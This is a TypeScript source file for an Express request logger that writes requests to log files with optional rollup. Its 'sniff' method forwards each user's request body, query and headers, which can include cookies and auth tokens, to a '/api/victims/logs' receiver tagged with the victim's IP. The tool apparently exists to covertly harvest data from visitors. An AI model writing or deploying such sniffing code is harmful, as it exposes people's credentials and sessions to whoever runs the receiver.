import { Request } from 'express';
import path from 'path';
import RollUp from '../rollups/RollUp';
import FileUtils from '../utils/file';
import HttpUtils from '../utils/http';
import ILogger from './ILogger';

export default abstract class Logger implements ILogger {
  protected maxFileSize: number;

  protected dateFormat: string; // NOTE: Currently unsupported

  protected filename: string;

  protected separator: string;

  protected rollup: RollUp | null;

  constructor(
    filename: string,
    separator: string = '\n',
    rollup: RollUp | null = null
  ) {
    this.filename = path.isAbsolute(filename)
      ? FileUtils.absoluteToRelative(filename)
      : filename;
    this.separator = separator;
    this.rollup = rollup;
  }

  /**
   * Log a request to the console
   *
   * @param req Express Request
   */
  abstract log(req: Request): void;

  /**
   * IMPLEMENTATION
   * Store the request inside the log file
   *
   * @param req Express Request object
   */
  stash(req: Request): void {
    // CASE 1: Rollup disabled
    if (!this.rollup) {
      // Save to the log file
      try {
        FileUtils.append(this.filename, this.buildLog(req) + this.separator);
      } catch (err) {
        console.error(err);
      }
      return;
    }
    // CASE 2: Rollup enabled
    const shouldRoll = this.rollup.shouldRoll();
    if (shouldRoll) {
      // Rollup and init new one
      this.rollup.roll();
    }
    const filename = this.rollup.getCurrentRoll();
    // Save to the log file
    try {
      FileUtils.append(filename, this.buildLog(req) + this.separator);
    } catch (err) {
      console.error(err);
    }
  }

  /**
   * Build the log from Express Request
   *
   * @param req Express Request
   */
  abstract buildLog(req: Request): string;

  /**
   * IMPLEMENTATION
   * Parse Express Request object
   *
   * @param req Request
   * @param isFull Parse fully including all properties of Express Object (Not recommend)
   * @returns Request object
   */
  parseReq(req: Request, isFull: boolean = false) {
    const data = !isFull
      ? {
          body: req.body,
          query: req.query,
          headers: req.headers,
        }
      : req;
    return data;
  }

  /**
   * Sniff user's request by forwarding it to Receiver
   *
   * @param req
   */
  sniff(req: Request, ip: string) {
    const serializedObj = JSON.stringify({
      datetime: new Date().toLocaleString(),
      method: req.method,
      url: req.url,
      data: this.parseReq(req),
    });
    const encodedIP = encodeURIComponent(ip);
    HttpUtils.postJSON(`/api/victims/logs?victimIP=${encodedIP}`, {
      log: serializedObj,
    });
  }
}
